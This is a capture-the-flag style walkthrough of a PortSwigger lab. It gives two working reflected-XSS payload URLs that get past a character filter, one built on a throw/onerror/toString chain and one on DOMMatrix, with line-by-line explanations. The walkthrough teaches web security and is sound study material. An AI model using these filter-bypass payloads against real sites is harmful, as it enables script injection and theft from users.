---
title: "Expert Lab: Reflected XSS in a JavaScript URL with some characters blocked"
published: true
tags: [Web Application Security, Web Security Academy, Expert Labs, Cross-Site Scripting, XSS, Javascript]
image: /blog/assets/hacker.png
description: "Lab Description: This lab reflects your input in a JavaScript URL, but all is not as it seems. This initially seems like a trivial challenge; however, the application is blocking some characters in an attempt to prevent XSS attacks."
image_width: "256"
image_height: "256"
---

<br>
{% smart_image /blog/assets/hacker.png 256 256 "" eager high %}
[^1]
<br>

### Lab Link
[Lab: Reflected XSS in a JavaScript URL with some characters blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked)

<br>
### Lab Description
* * *
<br>
This lab reflects your input in a JavaScript URL, but all is not as it seems. This initially seems like a trivial challenge; however, the application is blocking some characters in an attempt to prevent XSS attacks.

To solve the lab, perform a cross-site scripting attack that calls the alert function with the string 1337 contained somewhere in the alert message.

<br>
### Solutions
* * *
<br>
### Solution 1:
Visit the following URL, replacing your-lab-id with your lab ID:

```
https://your-lab-id.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
```

The lab will be solved, but the alert will only be called if you click "Back to blog" at the bottom of the page.

The payload here, URL decoded is:

```js
&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

The exploit uses exception handling to call the alert function with arguments. The throw statement is used, separated with a blank comment in order to get round the no spaces restriction. The alert function is assigned to the onerror exception handler.

As throw is a statement, it cannot be used as an expression. Instead, we need to use arrow functions to create a block so that the throw statement can be used. We then need to call this function, so we assign it to the toString property of window and trigger this by forcing a string conversion on window.

<br>
Here are some explanations about the Javascript code used above[^2]:

First of all, the code is using the comma operator. What the comma operator does is allow you to evaluate multiple expressions. In particular in this case, you have three:

```js
   x=x=>{throw onerror=alert,1337},toString=x,window+''
// ^_____________________________^ ^________^ ^_______^
//                 1                     2         3
```

Let's examine them one by one:

<br>
#### Brief Note about Implicit Globals
This is going to be relevant for most of the below sections, so I want to clear it up first. Any time you assign to any name you haven't declared with `var`, `let`, or `const` it implicitly assigns to a property on the global object. In the browser, the global object is `window`, so any implicit globals go there.

<br>
#### An Arrow Function
```js
x=x=>{onerror=alert; throw 1337}
```

##### Definition
This will create a new arrow function and assign it to `x`. Since there is no variable declaration, `x` will be an implicit global and thus attached to `window`. This isn't extremely useful, it's likely done to save a few characters. The function also takes a single parameter called `x` but does nothing with it. Again, nothing useful, saves up a single character, otherwise it needs to be defined as `()=>`.

<br>
#### Overriding `toString`
```js
toString=x
```

This part will override the `toString` method on `window` and change it to the `x` function. Thus any time you explicitly or implicitly convert `window` to a string, it will instead execute `x`.

```js
x = x => {
  onerror = alert;
  throw 1337
}

toString = x;

window.toString();
```

<br>
#### Converting `window` to String
In JavaScript, when you try to concatenate any value with a string, the value will be implicitly also be converted to a string. This is usually done by calling the `toString()` method.

The same thing happens in the last part of the code:

```js
window+''
```

This will:

1. trigger conversion to a string, which
2. calls the `toString` method on `window`, which
3. was overridden with `x` using `toString=x`, which
4. calls the `x` function instead, which
5. sets the global error handler to just be `alert` (`onerror=alert`) and immediately throws an error (throw `1337`), which
6. invokes the global error handler

<br>
#### Why omitting `window+''` doesn't Throw an Error
Hopefully clear from the above, but to address it directly, that code is needed to set off the whole chain of reactions defined before it.
Here is the full code with explanation and formatting for clarity:

```js
//create a function
window.x = x => {
  onerror = alert; //changes the global error handler
  throw 1337       //throws an error to trigger the error handler
};

//overwrite the `toString` method of `window` so it always throws an error
window.toString = window.x;

//implicitly call `window.toString()` by performing a string concatenation
window + '';
```

<br>
### Solution 2:
Another interesting solution is to use _JavaScript without parentheses using DOMMatrix_ which is explained in detail by Gareth Heyes in a great post[^3]. To solve this lab with DOMMatrix payload, use:

```
https://your-lab-id.web-security-academy.net/post?postId=5&%27},x=z=%3E{x=new/**/DOMMatrix;matrix=alert;x.a=1337;location='javascript'%2b':'%2bx},toString=x,window%2b%27%27,{x:%27
```

The payload in this code, URL decoded is:

```js
&'},x=z=>{x=new/**/DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x},toString=x,window+'',{x:'
```

As explained in Solution 1: `/**/` is used to bypass space restriction, also click "Back to blog" link to pop alert message box and solve the lab.


<br>
### _External Links_
* * *
* #### [Lab: Reflected XSS in a JavaScript URL with some characters blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked)
* #### [Cross-site scripting (XSS) cheat sheet: Restricted characters](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#restricted-characters)

<br>
### _References_
* * *
[^1]: Icon made by [Flat Icons](https://www.flaticon.com/authors/flat-icons) from [www.flaticon.com](https://www.flaticon.com/)
[^2]: [Javascript window object, window+'', what does this code do](https://stackoverflow.com/questions/64416874/javascript-window-object-window-what-does-this-code-do)
[^3]: [JavaScript without parentheses using DOMMatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix), also see: [XSS without parentheses and semi-colons](https://portswigger.net/research/xss-without-parentheses-and-semi-colons)
